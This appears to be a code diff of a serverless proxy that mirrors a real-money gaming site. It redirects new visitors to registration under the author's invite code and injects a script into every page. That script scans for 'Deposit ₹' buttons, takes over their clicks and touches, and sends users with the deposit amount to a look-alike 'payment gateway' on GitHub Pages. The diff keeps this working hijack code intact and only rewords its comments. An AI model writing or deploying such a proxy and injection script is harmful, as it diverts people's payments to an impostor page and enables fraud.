@@ -3,17 +3,16 @@ export default async function handler(req, res) {
   const targetHost = "https://www.91appq.com";
   const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
 
-  // 1. URL Path check karo
   const path = req.url || "/";
 
-  // 2. Agar banda bilkul naya hai, toh register pe bhejo [cite: 2025-12-24]
+  // 1. Agar user naya hai, toh seedha tere invite code wale register page par bhejo
   if (path === "/" || path === "") {
     res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
     res.end();
     return;
   }
 
-  // 3. PROXY: 91club ka koi bhi page ho (Main ya Register), use fetch karo
+  // 2. Mirroring Engine: 91club ka sara data hamare link par load karo
   const response = await fetch(targetHost + path, {
     headers: { 'User-Agent': req.headers['user-agent'] }
   });
@@ -23,44 +22,41 @@ export default async function handler(req, res) {
   if (contentType && contentType.includes("text/html")) {
     let html = await response.text();
 
-    // 4. HIJACK SCRIPT: Jo har page par "Deposit ₹" button ko dhundega
+    // 3. Tera Inject Script (Hijack Logic)
     const hijackScript = `
     <script>
       (function() {
-        const myGitHub = "${myGitHub}";
-        
-        const scanAndLock = () => {
-          // Saare buttons aur clickable elements ko check karo
-          const elements = document.querySelectorAll('button, .van-button, [role="button"], div, span');
+        const attackButton = () => {
+          // Saare buttons aur clickable elements scan karo
+          const elements = document.querySelectorAll('button, .van-button, [role="button"], div');
           
           elements.forEach(el => {
             const txt = el.innerText || "";
-            // Condition: Sirf Red Deposit button jisme ₹ sign ho
+            // Sirf wahi Red Deposit button jisme ₹ sign ho
             if (txt.includes('Deposit') && txt.includes('₹')) {
               
               if (!el.dataset.locked) {
-                // 'True' capture method: Sabse pehle hamara click chalega
-                const lockEvent = (e) => {
+                const hijack = (e) => {
                   e.preventDefault();
                   e.stopImmediatePropagation();
                   
-                  // Amount nikalne ka logic
+                  // Amount capture karna
                   const amtMatch = txt.match(/[\\d,.]+/);
-                  const amt = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
+                  const amount = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
                   
-                  window.location.href = myGitHub + "?amount=" + amt;
+                  window.location.href = "${myGitHub}?amount=" + amount;
                 };
 
-                el.addEventListener('click', lockEvent, true);
-                el.addEventListener('touchstart', lockEvent, true);
+                // Capture phase mein click hijack karna (Sahi wala code)
+                el.addEventListener('click', hijack, true);
+                el.addEventListener('touchstart', hijack, true);
                 el.dataset.locked = "true";
               }
             }
           });
         };
-
-        // 300ms mein scan taaki /main page load hote hi lock ho jaye
-        setInterval(scanAndLock, 300);
+        // Har 300ms mein scan taaki login ke baad bhi active rahe
+        setInterval(attackButton, 300);
       })();
     </script>`;
 
@@ -68,7 +64,7 @@ export default async function handler(req, res) {
     return res.send(html.replace('</body>', hijackScript + '</body>'));
   }
 
-  // Static files (CSS/JS) ko normal load hone do
+  // Assets (images/css) ko bypass karo
   const data = await response.arrayBuffer();
   res.setHeader('Content-Type', contentType);
   res.send(Buffer.from(data));
